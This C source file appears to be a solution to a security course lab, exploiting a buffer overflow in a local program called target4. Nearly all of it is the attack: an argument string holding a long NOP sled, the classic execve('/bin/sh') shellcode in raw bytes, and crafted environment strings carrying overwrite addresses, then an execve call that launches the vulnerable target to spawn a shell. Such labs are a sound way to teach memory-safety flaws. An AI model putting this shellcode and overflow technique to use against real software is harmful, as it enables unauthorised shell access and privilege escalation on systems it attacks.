#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
  char *args[3];
  char *env[7];

  args[0] = TARGET;
  // args[1] = "hi there";
  /* Note:
   * Shellcode is 45 bytes (excluding null terminator)
   * 
   */
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90\x90\x90\x90\x90\x90"
	    "\x90\x90\x90"
	    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  	    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  	    "\x80\xe8\xdc\xff\xff\xff/bin/sh"
	    "\xc0\x00";
  args[2] = NULL;

  env[0] = "\x00";
  env[1] = "\x00";
  env[2] = "\xb0\x00";
  env[3] = "\x00";
  env[4] = "\x00";
  env[5] = "\xb0\xfd\x2d\x20"
	   "\xb0\xfd\x2d\x20"
	   "\xb0\xfd\x2d\x20";
  env[6] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
